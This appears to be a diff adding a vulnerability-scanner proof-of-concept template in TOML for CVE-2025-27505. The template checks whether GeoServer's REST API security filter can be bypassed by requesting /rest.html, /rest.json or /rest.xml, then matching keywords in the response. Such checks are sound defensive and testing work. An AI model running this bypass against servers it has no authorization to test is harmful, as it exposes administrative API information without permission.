@@ -1,0 +1,58 @@
+[info]
+author = "ave"
+description = "通过访问 /rest.html 绕过 GeoServer REST API 安全过滤器，验证是否存在未授权访问漏洞。若返回 REST API 索引页面内容（如扩展信息、API 端点列表），则说明存在漏洞。"
+id = "POC-AVE-2025-0014"
+name = "GeoServer REST API 未授权访问 PoC"
+severity = "medium"
+tags = ["ave-2025-0014"]
+vuln_id = [
+    "CVE-2025-27505",
+    "AVE-2025-0014",
+]
+
+[poc]
+logic = "any"
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/rest.html"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "GeoServer",
+    "REST API",
+    "extensions",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/rest.json"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "GeoServer",
+    "extensions",
+    "about",
+]
+
+[[poc.requests]]
+method = "GET"
+path = "/{{BaseURL}}/rest.xml"
+protocol = "http"
+
+[[poc.requests.matchers]]
+expect = true
+part = "body"
+type = "word"
+words = [
+    "GeoServer",
+    "extensions",
+]
